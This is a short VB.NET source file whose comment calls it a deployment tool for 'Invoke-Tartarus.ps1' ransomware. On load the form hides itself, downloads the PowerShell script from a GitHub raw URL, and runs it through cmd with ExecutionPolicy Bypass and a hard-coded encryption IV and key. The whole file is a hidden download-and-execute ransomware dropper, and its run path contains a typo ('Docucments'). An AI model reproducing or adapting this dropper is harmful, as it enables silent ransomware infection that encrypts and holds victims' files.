Public Class Form1
    ' Coded by Bailey Dunlap
    ' Deployment of Invoke-Tartarus.ps1 Ransomware using Download and Execute with VB.NET Hidden form application and CMD commands
    ' Created on 1/10/18

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Me.Visible = False
        My.Computer.Network.DownloadFile("https://raw.githubusercontent.com/giMini/Tartarus/master/Invoke-Tartarus.ps1", "C:\Documents and Settings\All Users\Documents\Invoke-Tartarus.ps1")
        Process.Start("cmd.exe", "/k cd C:\Windows\System32 & powershell –ExecutionPolicy Bypass C:\Documents and Settings\All Users\Docucments\Invoke-Tartarus.ps1 - MaxExecutionTime 5000 -IV RvQUR/CILm1UiQN/u+BABA== -Key lvk3AlqoxLFbKjHXTuHs500WEM7Y+6zAX1Y/F7kD+5U=")
    End Sub

End Class
